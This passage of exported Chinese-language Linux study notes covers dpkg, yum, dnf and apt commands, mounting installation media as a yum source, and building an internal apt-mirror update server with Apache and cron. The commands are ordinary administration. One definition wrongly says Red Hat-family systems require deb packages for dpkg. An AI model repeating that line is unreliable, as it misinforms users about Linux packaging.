integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4af58809-828a-4cef-bfe1-99fd4a14ed24" class="code"><code class="language-Shell">sudo dpkg -i package.deb #安装deb包
sudo dpkg -r package-name #卸载软件包</code></pre></details></li></ul><ul id="fb7b5bb1-1e6d-4e1b-961a-e22bc4bfead3" class="toggle"><li><details open=""><summary>查询：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0676b8b1-5e92-42bd-a341-fbdfb1929be0" class="code"><code class="language-Shell">dpkg -I package.deb #检查软件包依赖关系
dpkg --list #显示已安装软件包列表

dpkg --status package-name #显示已安装软件包的详细信息</code></pre></details></li></ul></details></li></ul><ul id="f197f241-ef31-4ecc-ae56-213eedc05014" class="toggle"><li><details open=""><summary><strong>deb包：</strong></summary><p id="69c91f07-3eb9-4a97-a777-8b80b8fead75" class="">【定义】</p><p id="65e114e0-9572-448e-88a5-6851ca385849" class="">红帽系列linux要求软件发行者把他们的二进制安装文件以deb格式打包，以便于统一用dpkg包管理工具对其进行安装</p></details></li></ul><h2 id="614b0ad8-b714-456a-9b4a-21d1f01481fc" class="">（三）yum服务器包安装</h2><h3 id="d1fdc4ae-0593-4846-89d6-ff3f10d83b45" class="">1-红帽系列</h3><p id="69c8def5-f9bb-4817-883e-22c1f3a8adcf" class="">yum：<div class="indented"><p id="f697649a-f326-4fc5-ab0d-bfd29fe8522b" class="">【定义】</p><p id="788c6f6e-3824-45e6-8b8f-abc964d79f64" class="">是基于rpm开发的一个更高级的包管理工具，用于centos7及以下版本，其提供以下功能：</p><p id="75a3cd66-c45b-474b-bf7e-b340d50acbbc" class="">1、软件包（rpm）的自动下载+安装，以及软件包的更新</p><p id="2a28d47b-0b5f-44ac-8a3a-291eeae0fa83" class="">2、解决软件包依赖问题：遇到依赖问题时，自动搜索下载安装相关依赖包</p><p id="6469b464-97bd-4e82-b057-05077f80ce69" class="">3、软件包组的下载：可以一次性下载安装某种功能相关的一组软件包，不用一个一个下载安装</p><p id="638fde7a-ff55-4959-870e-12c7f5e96c72" class="">但是其要求必须要有一个软件包服务器，yum通过访问服务器以获得软件包的下载</p><p id="cf9fdc89-01ea-4f86-9e23-91ef43657eac" class="">【相关指令】</p><ul id="e355b3e5-fcb1-4050-a33a-969c53fb6b0e" class="toggle"><li><details open=""><summary>下载安装：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="627217f9-04d1-4d32-a444-09830551c899" class="code"><code class="language-Shell">yum search 关键字                #查询该关键字对应可以安装哪些包
sudo yum install -y package-name    #安装软件包
sudo yum remove package-name     #卸载软件包
sudo yum update package-name     #更新软件包

sudo yum groupinstall group-name #安装软件包组
sudo yum groupremove group-name  #卸载软件包组</code></pre></details></li></ul><ul id="cd664006-edbe-4243-b370-b422fddceb81" class="toggle"><li><details open=""><summary>查询：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f12f9fa4-81ec-425e-b0d0-c5f96211dab2" class="code"><code class="language-Shell">yum deplist package-name   #显示已安装软件包的依赖关系
sudo yum list updates      #列出可用更新
yum provides /path/to/file #查询系统中某一文件来自哪个rpm包（不小心改错文件时，可以用这个命令查询其对应rpm包，然后重装之）

yum info package-name      #显示软件包信息
yum grouplist              #显示软件包组信息</code></pre></details></li></ul><p id="cb320b9f-9910-4b83-9c70-a227cedc7d6c" class="">【其他】</p><ul id="8ecfb11c-e68f-4783-b274-b07f3511f6cf" class="toggle"><li><details open=""><summary>红帽将安装光盘作为yum源</summary><blockquote id="5a767fdf-a59d-4da2-a996-8de133f970e6" class="">注意：经过测试，该操作会导致yum的网络源失效！</blockquote><p id="a7d540ff-da40-409c-8d43-544d3f08a96a" class="">【前置知识】</p><p id="ffeaf46a-d06e-48d6-ac1c-66056d8a5055" class="">CentOS-Base.repo 是yum 网络源的配置文件</p><p id="db889041-5b56-416d-bf58-b6e76092d89a" class="">CentOS-Media.repo 是yum 本地源的配置文件</p><p id="9aa856f0-f558-46fe-a418-987d2c1347e7" class="">【操作】</p><p id="9a431432-a524-4109-88b5-ad02cb929bf7" class="">1、把光盘接入linux虚拟机中<div class="indented"><figure id="2f6bbf7f-bf3e-4f67-86c7-155ff73069fd" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled%201.png"><img style="width:480px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled%201.png"/></a></figure><p id="0a3715f4-00d5-40ad-90d4-783f7b7df087" class="">这样等会我们开机后就应该可以找到一个设备叫做/dev/cdrom</p><p id="ba73627a-3eef-46d5-b46b-ece37c3762ae" class="">如果不是的话，则用以下操作查看到它的挂载点</p><figure id="aa5b4515-3b56-4d4e-8ba3-a99ae891cfc6" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled%202.png"><img style="width:528px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled%202.png"/></a></figure></div></p><p id="b8040a67-2a1f-4424-9b34-b464c99cfd4c" class="">2、将该光盘设备挂载到/mnt/cdrom<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f0c96f6e-aa09-45a7-b183-d0b798302084" class="code"><code class="language-Shell">mkdir /mnt/cdrom
mount /dev/cdrom /mnt/cdrom
ls -hl /mnt/cdrom #查看是否成功挂载</code></pre></div></p><p id="fbb2ab1d-45fa-41f7-ad13-2f22fb1b471d" class="">3、配置yum服务器的CentOS-Media.repo文件<div class="indented"><p id="d8ef5718-d74b-44d4-ae63-451246612cb3" class="">备份：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f6df76ce-5913-4279-a58f-03461c8b8532" class="code"><code class="language-Shell">cd /etc/yum.repos.d/
mv CentOS-Base.repo CentOS-Base.repo.bak </code></pre><p id="d7b8aefd-40f3-4ff3-a2d6-17192689311c" class="">编辑之：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9fd6ffcb-bf8a-418f-8129-89ef13c5958c" class="code"><code class="language-Shell">vim CentOS-Base.repo</code></pre><p id="573aa9c9-a7a8-4ef5-a6d4-7f3fe834249c" class="">写入：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52bee41f-9fa3-4e3b-b302-a1c55207f333" class="code"><code class="language-Shell">[base]
name=local
baseurl=file:///mnt/cdrom

#gpgcheck=0表示不检查签名，enabled表示该配置文件生效
gpgcheck=0
enabled=1</code></pre></div></p><p id="fefbd747-eb24-44e3-aad3-0b65d7c59cdd" class="">4、重置yum缓存<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="93f9a8c6-2e30-47bf-bbd3-e0e0fe92eaab" class="code"><code class="language-Shell">yum  clean all
yum  makecache</code></pre></div></p></details></li></ul><ul id="68efc7f2-1cbd-4d8d-9a27-4ee952514435" class="toggle"><li><details open=""><summary>yum存放软件包的地方</summary><p id="fc3a83e0-9fb4-4810-8fa1-0b6eb955ca0e" class="">centos下的yum软件包通常存储在<code>/var/cache/yum/x86_64/{centos版本}/base/packages/</code></p></details></li></ul></div></p><p id="cb171c57-881d-4659-874a-34dfc6d7c413" class="">dnf：<div class="indented"><p id="8afb774b-5733-49a8-8a27-6fe4b7b9f4bd" class="">【定义】</p><p id="0df72a55-5ad4-4b6f-9ae3-68f9e79bee2b" class="">是yum的一个升级版，用于centos8及以上版本</p></div></p><h3 id="74a7a2bb-384d-4c48-ad75-7e37dcf4cb26" class="">2-Debian系列</h3><p id="1331729d-d44e-4ffa-98db-39e7e229ba88" class="">apt-get：<div class="indented"><p id="a638af21-a662-453b-ba8b-ce341a4c2354" class="">【定义】</p><p id="7ed01206-e237-4dd3-90d0-1e2190c1c0b3" class="">是基于dpkg开发的一个更高级的包管理工具，功能类似于yum</p><p id="6d790775-3aea-4272-bf97-db13f9c5a4ec" class="">是比较早期的Debian高级包管理工具</p></div></p><p id="97917cc9-960a-44ab-bab4-0a01e245cc69" class="">apt：<div class="indented"><p id="a5e08ed6-f667-4fa1-8da1-3199c84917cf" class="">【定义】</p><p id="3920b94e-c22d-4c2d-a3fd-df91f87a7d23" class="">是apt-get的升级版，主要升级内容是使其命令更简洁了</p><p id="e8ce1aad-0ebd-4c6c-9d1f-713cce5cf249" class="">【相关指令】</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2ab1fa4-fc4c-470f-97bb-a4bfc4347e77" class="code"><code class="language-Shell">apt install package-name #安装软件包。
apt remove package-name  #卸载软件包。
apt update               #更新可用的软件包列表。
apt upgrade              #升级已安装的软件包。
apt full-upgrade         #执行系统升级，包括依赖关系的解决。
dpkg -l | grep 关键词     #查看当前apt安装了哪些“关键词”相关的包</code></pre><p id="247aaf5e-4389-4d84-beb5-e597b580c1aa" class="">【换源】</p><ul id="a19d562d-48fd-477a-b11c-c7fea2cd702b" class="toggle"><li><details open=""><summary>参考该笔记</summary><figure id="3e259a89-201a-4b9e-ba39-1b34b8c570c2" class="link-to-page"><a href="../linux%E8%A3%85%E7%B3%BB%E7%BB%9F%201900427e38bb80abad3dffc1663bd567/kali2022%E7%AE%80%E5%8D%95%E5%88%9D%E5%A7%8B%E5%8C%96%E5%AE%89%E8%A3%85%203e259a89201a4b9eba391b34b8c570c2.html"><span class="icon">🌿</span>kali2022简单初始化安装</a></figure></details></li></ul><p id="93fc8a53-0bb9-4a5a-be5e-24c97863db19" class="">【企业自主搭建源】</p><ul id="3e1162d3-1da2-4c37-9e89-7f1c94b12537" class="toggle"><li><details open=""><summary>意义——这么做的优缺点</summary><p id="fff0427e-38bb-806c-ba1e-d65dea42ffff" class="">【优点】</p><p id="25ff8b0b-b387-4498-8a49-970da72aba8b" class="">1、防止企业内网主机在自我更新的过程中，不小心外联到被污染的服务器而下载来恶意文件</p><p id="fff0427e-38bb-8026-83e3-ff26e00acf78" class="">2、能够通过设置监控程序，记录内网 Linux 服务器安装软件包的情况<div class="indented"><blockquote id="016c1f6a-2684-4797-9de1-a412cabdfe50" class="">这样当“某个版本的软件包发生安全漏洞”时，可以快速锁定目标</blockquote></div></p><p id="ed5f90ba-1f91-4342-999e-5a0c257efbed" class="">3、企业内网下载速度快</p><p id="d9611536-f23a-44ff-a21e-6693e9a02dc7" class="">【缺点】</p><p id="2d091422-8f80-43b4-b3b6-268bcc877c3b" class="">这种中心化的网络架构，会导致只要服务主机被拿下，其他主机就有可能会马上被投毒</p></details></li></ul><ul id="622dec99-3aba-4125-8143-6f0d6ce7ad74" class="toggle"><li><details open=""><summary>操作——以 APT 为例，搭建 Ubuntu 20.04 lts 的更新源</summary><blockquote id="bb0826f2-ff19-48d5-b47d-3c157c7fbb3b" class="">整体思路：搭建一个企业内网专用的更新源，定期同步官方源，让其他Linux 服务器使用这个源</blockquote><p id="fff0427e-38bb-8032-9a38-df4050b3b9e9" class="">【配置服务器】</p><p id="d96e7995-e87b-42aa-9077-d371e14a05d9" class="">1、<strong>安装 apt-mirror</strong><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="140d2809-30d9-41a4-9425-0d17fc96dbb7" class="code"><code class="language-Shell">sudo apt update
sudo apt install apt-mirror</code></pre><blockquote id="fff0427e-38bb-809f-8599-fb2f1d27ca50" class="">该工具的作用是：同步软件包到本地镜像服务器</blockquote></div></p><p id="40b46049-cda5-4a15-90fe-23037c1df525" class="">2、<strong>修改 apt-mirror 的配置文件</strong><div class="indented"><p id="d441a3f0-ece4-46bc-a3db-e49eeaa08f8d" class=""><mark class="highlight-default_background"><code>vim  /etc/apt/mirror.list</code></mark></p><ul id="90aee7a3-bcec-4008-8d38-12a2e7e7c538" class="toggle"><li><details open=""><summary>修改方式如下</summary><p id="103acb06-e820-4f54-8f81-c1811ff87e50" class="">修改前：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f2f36427-6930-4222-acd8-6f9946d03942" class="code"><code class="language-Shell">############# config ##################
#
# set base_path    /var/spool/apt-mirror
#
# set mirror_path  $base_path/mirror
# set skel_path    $base_path/skel
# set var_path     $base_path/var
# set cleanscript $var_path/clean.sh
# set defaultarch  &lt;running host architecture&gt;
# set postmirror_script $var_path/postmirror.sh
# set run_postmirror 0
set nthreads     20
set _tilde 0
#
############# end config ##############

deb http://archive.ubuntu.com/ubuntu kinetic main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu kinetic-security main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu kinetic-updates main restricted universe multiverse
#deb http://archive.ubuntu.com/ubuntu kinetic-proposed main restricted universe multiverse
#deb http://archive.ubuntu.com/ubuntu kinetic-backports main restricted universe multiverse

deb-src http://archive.ubuntu.com/ubuntu kinetic main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu kinetic-security main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu kinetic-updates main restricted universe multiverse
#deb-src http://archive.ubuntu.com/ubuntu kinetic-proposed main restricted universe multiverse
#deb-src http://archive.ubuntu.com/ubuntu kinetic-backports main restricted universe multiverse

clean http://archive.ubuntu.com/ubuntu
</code></pre><blockquote id="df9ff7a7-8fdc-4b5f-995d-92e6c7fb1773" class="">其中：<p id="392927b1-2348-439c-b0e9-a68ab3bdf5ef" class=""><code>kinetic-security main</code>是安全更新的镜像源</p><p id="8fea581a-4cc1-4b2e-9ddb-043f181fde12" class=""><code>kinetic-updates main</code>是常规更新的镜像源</p><p id="009395cf-ea57-470a-8c50-5e471796a1da" class=""><code>kinetic-proposed main</code>是预发布软件的镜像源</p><p id="766bfbbd-b894-4e78-a895-ff82519019a1" class=""><code>kinetic-backports main</code>是回溯软件包的镜像源</p><p id="6ce12b2c-d72d-4614-940c-0b79324a2e24" class="">deb开头的是软件，deb-src是软件的源码包</p></blockquote><p id="5b1ee27c-c858-4367-a97a-970da07726ed" class="">👆这里默认的更新源是当前系统的，我们修改为 Ubuntu 20.04 lts 的，修改后：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9d5acb45-327b-4289-86e1-190ab48352a2" class="code"><code class="language-Shell">############# config ##################
#
# set base_path    /var/spool/apt-mirror
#
# set mirror_path  $base_path/mirror
# set skel_path    $base_path/skel
# set var_path     $base_path/var
# set cleanscript $var_path/clean.sh
# set defaultarch  &lt;running host architecture&gt;
# set postmirror_script $var_path/postmirror.sh
# set run_postmirror 0
set nthreads     20
set _tilde 0
#
############# end config ##############

deb http://archive.ubuntu.com/ubuntu focal main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu focal-security main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu focal-updates main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu focal-proposed main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu focal-backports main restricted universe multiverse

clean http://archive.ubuntu.com/ubuntu/</code></pre><blockquote id="44b35c04-70c5-429b-9523-467887559c33" class="">如果想要节省硬盘空间和下载时间，也可以只同步64位的软件包 （使用 deb-amd64前缀而不是deb）</blockquote></details></li></ul></div></p><p id="34eea2ac-249e-4b92-b8cd-b529f7ca3a22" class="">3、<strong>开始同步官方软件包</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d10b135-f455-4523-8375-5e5414df7439" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sudo apt-mirror</code></pre><blockquote id="b2e372ed-04ea-4734-97c6-0bbd0a31ada8" class="">大概要下载 417G 左右内容，全部存储在/var/spool/apt-mirror/目录下</blockquote><p id="00e9d212-dba9-48cf-a678-c256bd4fcfd5" class="">4、<strong>安装 apache 服务器</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ecaaab4-90cc-4812-9d24-c653291de1e0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sudo apt-get update
sudo apt-get install apache2
</code></pre><p id="fdb075a4-72a8-4c0a-a6db-b653b6bc8cc4" class="">然后将软件包目录链接到web目录下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0b0e418a-7c6c-435f-9008-864ec058370f" class="code"><code class="language-Shell">sudo ln -s /var/spool/apt-mirror/mirror/archive.ubuntu.com/ubuntu /var/www/html/ubuntu</code></pre><p id="f21585f4-f859-43c2-aa79-a559dbf6ff77" class=""><strong>5、通过计划任务定期更新</strong></p><p id="9f389b69-1540-423a-926d-0c8f6f9ed684" class=""><mark class="highlight-default_background">书写一个脚本文件 </mark><mark class="highlight-default_background"><code>/opt/update_mirror.sh</code></mark><mark class="highlight-default_background">，内容如下：</mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa501145-54fc-4b28-a123-b3dc5435ff5c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash

# 更新源
apt-mirror
</code></pre><p id="d5922abc-91ca-47ba-a6ae-9af0d9365715" class="">创建计划任务</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b22430b9-3a94-4ff0-adeb-2def6843a98f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sudo crontab -e</code></pre><p id="8d939e10-06d1-4b5a-9a81-06b968394613" class="">添加以下内容</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0f41a516-34cf-413b-85b3-5b17e4b88f79" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">0 2 * * * /opt/update_mirror.sh &gt;/dev/null 2&gt;&amp;1  #每天凌晨两点定时更新</code></pre><p id="04b86582-0b34-453f-872a-31c9c75bb8ad" class="">【配置客户端】</p><p id="478e59be-ebdd-4c0d-a9f5-80bc3b913212" class="">1、配置内网主机使用该内网服务器作为更新源</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" 